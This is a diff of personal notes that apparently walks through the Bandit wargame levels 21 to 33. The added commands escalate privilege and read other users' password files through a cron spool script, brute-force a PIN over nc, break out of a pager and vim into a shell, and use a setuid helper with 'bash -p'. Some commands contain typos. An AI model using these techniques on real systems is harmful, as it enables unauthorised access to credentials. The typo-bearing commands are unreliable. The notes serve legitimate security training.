@@ -268,9 +268,160 @@ paste flag key bandit20
 # Level 21
 ls
 whoami
-ls -l /etc/crown.d
-cat /etc/crown.d/cronjob_bandi22
-cat /usr/bin/crownjob_bandit22.sh
+ls -l /etc/cron.d
+cat /etc/cron.d/cronjob_bandi22
+cat /usr/bin/cronjob_bandit22.sh
 cat /tmp/13n12j3219312mk
 
 # Level 22
+ls
+whoami
+ls /etc/cron.d
+cat /etc/cron.d/cronjob_bandi23
+cat /usr/bin/cronjob_bandi23.sh
+
+echo "Hi there" | md5sum
+cat /tmp/81738921dad122390128
+
+# Level 23
+ls
+ls /etc/cron.d
+cat /etc/cron.d/cronjob_bandi24.sh
+
+ls -l /var/spool/bandit24  --> permission denied
+
+mktemp -d 
+cd /tmp/tmp.13da13dgfr
+chmod o+wrx ../tmp.13da13dgfr
+touch script.sh
+chmod -x script.sh
+nano script.sh
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.13da13dgfr/yintaowned.txt
+
+cp script.sh /var/spool/bandit24/script.sh
+watch -n 1 ls -l  --> ceach sec make ls -l 
+
+cat /tmp/tmp.13da13dgfr/yintaowned.txt
+
+# Level 24
+cat /etc/cron.d/cronjob_bandi25_root
+cat /usr/bin/cronjob_bandit25.sh
+
+mktemp -d
+cd /tmp/tmp.13da13dgfr
+touch script.sh
+chmod +x !$
+nano script.sh
+
+for i in $(seq 1 100); do echo $i; done
+
+#!/bin/bash
+for i in {0000..9999}; do 
+    echo "Uo9021809udamkm $i";  
+done
+
+./script.sh > dictionary.txt
+cat dictionary.txt | wc -l
+
+cat dictionary.txt | nc localhost 30002
+cat dictionary.txt | nc localhost 30002 | grep -v -E "Wrong|Please"  --> grep -v: dont show -E: various match
+
+# Level 25 - 26
+ls
+ssh -i bandit26.sshkey bandit26@localhost --> session Closed
+ssh -i bandit26.sshkey bandit26@localhost bash
+
+cat /etc/passwd | grep bandit26 --> /usr/bin/showtext
+cat /etc/passwd | grep bandit25 --> /bin/bash
+
+cat /usr/bin/showtest
+
+ssh -i bandit26.sshkey bandit26@localhost --< mode MORE
+v --> shift+: --> /etc/bandit_pass/bandit26 --> shift +:wq
+
+v --> :set shell=/bin/bash --> :shell
+whoami
+ls
+./bandit27-do
+./bandit27-do whoami
+./bandit27-do bash -p
+whoami
+cat /etc/bandit_pass/bandit27
+
+
+# Level 27
+ls
+mktemp -d
+cd /tmp/tmp.j21321DADSaa
+git clone <repository>
+cd repo
+cat README
+
+# Level 28
+ls
+
+mktemp -d
+cd /tmp/tmp.j21321DADSaa
+git clone <repository>
+cd repo
+cat README.md
+
+git log -p --> commit
+
+
+# Level 29
+ls
+mktemp -d
+cd /tmp/tmp.j21321DADSaa
+git clone <repository>
+cd repo
+cat README.md
+git log -p 
+
+git branch -r --> list branch
+git checkout dev
+git log -p
+
+
+# Level 30
+ls
+mktemp -d
+cd /tmp/tmp.j21321DADSaa
+git clone <repository>
+cd repo
+cat README.md
+git log -p
+git branch -r 
+
+git tag
+git show secret
+
+# Level 31 
+ls
+mktemp -d
+cd /tmp/tmp.j21321DADSaa
+git clone <repository>
+cd repo
+cat README.md
+
+touch key.txt
+echo "May I come in?" > key.txt
+rm .gitignore
+git add key.txt
+git commit -m "Add new key"
+git push -u origin master
+
+# Level 32
+$0 --> spawn shell
+whoami
+ls
+cat /etc/bandit_pass/bandit33
+
+# Level 33 End
+cat README.txt
+
+
+
+
